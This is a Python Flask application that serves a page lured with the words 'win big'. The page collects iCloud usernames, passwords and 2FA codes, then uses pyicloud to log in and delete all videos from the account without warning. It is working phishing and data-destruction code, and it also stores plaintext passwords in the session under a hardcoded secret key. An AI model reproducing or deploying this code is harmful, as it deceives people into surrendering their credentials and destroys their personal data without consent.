from flask import Flask, request, render_template_string, flash, redirect, url_for, session
from pyicloud import PyiCloudService
import time

app = Flask(__name__)
app.secret_key = "your_secret_key"  # Required for session management

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>win</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; margin: 50px; }
        .container { background: white; padding: 20px; width: 300px; margin: auto; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); border-radius: 10px; }
        h2 { color: #333; }
        form { margin-top: 20px; }
        input { display: block; width: 90%; padding: 10px; margin: 10px auto; border: 1px solid #ccc; border-radius: 5px; }
        button { background-color: #007BFF; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        button:hover { background-color: #0056b3; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>

    <div class="container">
        <h2>win big</h2>

        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <p class="{{ category }}">{{ message }}</p>
                {% endfor %}
            {% endif %}
        {% endwith %}

        {% if not two_fa %}
            <form method="POST">
                <input type="text" name="username" placeholder="iCloud Username" required>
                <input type="password" name="password" placeholder="iCloud Password" required>
                <button type="submit">Login</button>
            </form>
        {% else %}
            <form method="POST" action="/verify_2fa">
                <input type="text" name="code" placeholder="Enter 2FA Code" required>
                <button type="submit">Verify 2FA</button>
            </form>
        {% endif %}
    </div>

</body>
</html>
"""

# Store iCloud session
icloud_sessions = {}


def delete_videos(api):
    try:
        videos = [photo for photo in api.photos.all if photo.item_type == "video"]

        if not videos:
            return "No videos found in iCloud."

        for video in videos:
            try:
                video.delete()
            except Exception as e:
                return f"Error deleting {video.filename}: {e}"

        return f"Deleted {len(videos)} videos from iCloud."

    except Exception as e:
        return f"Error accessing iCloud: {e}"


@app.route("/", methods=["GET", "POST"])
def icloud_login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        if not username or not password:
            flash("Username and password are required!", "error")
            return redirect(url_for("icloud_login"))

        try:
            api = PyiCloudService(username, password)

            if api.requires_2fa:
                session["username"] = username
                session["password"] = password
                icloud_sessions[username] = api  # Store session
                flash("2FA is required. Check your Apple devices and enter the code below.", "error")
                return render_template_string(HTML_TEMPLATE, title="Verify 2FA", two_fa=True)

            result = delete_videos(api)
            flash(result, "success" if "Deleted" in result else "error")

        except Exception as e:
            flash(f"iCloud Login Failed: {e}", "error")

        return redirect(url_for("icloud_login"))

    return render_template_string(HTML_TEMPLATE, title="Delete iCloud Videos", two_fa=False)


@app.route("/verify_2fa", methods=["POST"])
def verify_2fa():
    if "username" not in session or "password" not in session:
        flash("Session expired. Please log in again.", "error")
        return redirect(url_for("icloud_login"))

    username = session["username"]
    code = request.form["code"]

    if username in icloud_sessions:
        api = icloud_sessions[username]

        try:
            if api.validate_2fa_code(code):
                flash("2FA authentication successful!", "success")

                # Wait a bit for authentication to fully complete
                time.sleep(2)

                # Proceed with deleting videos
                result = delete_videos(api)
                flash(result, "success" if "Deleted" in result else "error")

                # Remove session after successful deletion
                del icloud_sessions[username]
                session.pop("username", None)
                session.pop("password", None)

                return redirect(url_for("icloud_login"))
            else:
                flash("Invalid 2FA code. Try again.", "error")
                return render_template_string(HTML_TEMPLATE, title="Verify 2FA", two_fa=True)

        except Exception as e:
            flash(f"2FA verification failed: {e}", "error")

    return redirect(url_for("icloud_login"))


if __name__ == "__main__":
    app.run(debug=True)
